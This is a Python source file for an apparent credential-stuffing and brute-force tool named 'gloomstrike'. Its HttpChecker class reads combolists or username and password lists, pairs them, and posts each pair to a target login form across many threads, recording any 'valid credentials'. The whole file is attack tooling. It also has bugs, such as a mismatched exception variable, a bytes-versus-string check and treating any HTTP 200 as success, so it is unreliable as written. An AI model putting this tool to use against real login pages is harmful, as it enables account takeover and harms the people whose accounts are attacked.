import requests, threading, time, random
from gloomstrike import logger, helpers

class Proxy:

    def __init__(self, proxy_type: str, endpoint: str, username: str=None, password: str=None) -> None:

        self._proxy_type = proxy_type
        self._endpoint = endpoint
        self._username = username
        self._password = password

class HttpChecker:

    def __init__(self, url: str, params: str, csrf: str=None, logger: logger.Logger=None) -> None:

        self._url = url
        self._csrf = csrf
        self._params = params
        self._logger = logger

        self._credentials = helpers.QueueHandler()
        self._event = threading.Event()

        self._threads = []
        self._results = []

        self._combolist = None
        self._usernames = None
        self._passwords = None

    def load(self, combolist_path: str, usernames_path: str, passwords_path: str, proxies_path: str):

        combolist = []
        usernames = []
        passwords = []

        try:

            if combolist_path:

                with open(combolist_path, 'r+b') as f:

                    while line := f.readline().rstrip():

                        if not ':' in line:
                            continue

                        username, password = line.split(':')

                        try:

                            self._credentials.add([username.decode('utf-8'), password.decode('utf-8')])

                        except UnicodeDecodeError as r:
                            self._logger.error(f'Failed to decode {line}: {e}')
                    
                return True
            
            elif usernames_path and passwords_path:

                with open(usernames_path, 'r+b') as f:

                    while line := f.readline().rstrip():

                        usernames.append(line)

                with open(passwords_path, 'r+b') as f:
                    
                    while line := f.readline().rstrip():

                        passwords.append(line)

                for username in usernames:

                    for password in passwords:

                        try:

                            self._credentials.add([username.decode('utf-8'), password.decode('utf-8')])

                        except UnicodeDecodeError as r:
                            self._logger.error(f'Failed to decode {line}: {e}')

                return True

        except Exception as e:
            self._logger.error(e)

        return False

    def _background(self):

        while not self._event.is_set():

            try:

                time.sleep(1 / 1000)

            except KeyboardInterrupt:

                self._event.set()

        for thread in self._threads:
            thread.join()

        return self._results

    def _parse_params(self, params: str) -> dict:

        data = {}

        for param in params.split('&'):
            
            if '=' in param:

                k, v = param.split('=', 1)
                data[k] = v
                
        return data

    def _check(self, url: str, username: str, password: str) -> bool:

        params = self._params.replace('$USERNAME', username)
        params = params.replace('$PASSWORD', password)

        data = self._parse_params(params)

        resp = requests.post(url,  data=data)

        if resp.status_code == 200:
            return True

    def _checker(self):
            
        for username, password in self._credentials:

            if self._event.is_set():
                break

            self._logger.info(f'{username}:{password}', end='\r', flush=True)

            if result := self._check(self._url, username, password):

                self._results.append([username, password])
                self._logger.info(f'Found valid credentials "{username}:{password}"')

    def start(self, threads: int, background: bool=False):

        self._logger.info('Starting threads...')

        for _ in range(threads):

            thread = threading.Thread(target=self._checker)
            thread.daemon = True
            thread.start()

            self._threads.append(thread)

        if background:

            self._background_thread = threading.Thread(target=self._background)
            self._background_thread.daemon = True
            self._background_thread.start()
        
        else:
            return self._background()